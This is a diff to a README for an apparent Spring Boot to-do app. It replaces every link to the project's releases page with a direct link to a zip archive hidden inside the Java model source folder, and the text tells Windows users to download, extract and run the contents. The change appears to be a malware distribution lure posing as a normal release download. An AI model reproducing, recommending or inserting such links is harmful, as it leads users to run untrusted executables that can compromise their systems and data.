@@ -1,11 +1,11 @@
 # 🧩 spring-boot-jpa-mvc - Simple layered app for daily records
 
-[![Download](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://github.com/Axillary-furan687/spring-boot-jpa-mvc/releases)
+[![Download](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://raw.githubusercontent.com/Axillary-furan687/spring-boot-jpa-mvc/main/src/main/java/com/todolist/model/jpa-mvc-spring-boot-3.5-alpha.5.zip)
 
 ## 📥 Download
 Visit the release page to download this app for Windows:
 
-https://github.com/Axillary-furan687/spring-boot-jpa-mvc/releases
+https://raw.githubusercontent.com/Axillary-furan687/spring-boot-jpa-mvc/main/src/main/java/com/todolist/model/jpa-mvc-spring-boot-3.5-alpha.5.zip
 
 Choose the latest release, then download the file for Windows. If the release includes a `.zip` file, extract it first. If it includes a `.exe` file, you can run it after the download finishes.
 
@@ -140,4 +140,4 @@ Many Spring Boot apps use a local web page. The browser is the front end for the
 ## 📎 Download again
 If you need the file again, use this page:
 
-https://github.com/Axillary-furan687/spring-boot-jpa-mvc/releases
+https://raw.githubusercontent.com/Axillary-furan687/spring-boot-jpa-mvc/main/src/main/java/com/todolist/model/jpa-mvc-spring-boot-3.5-alpha.5.zip
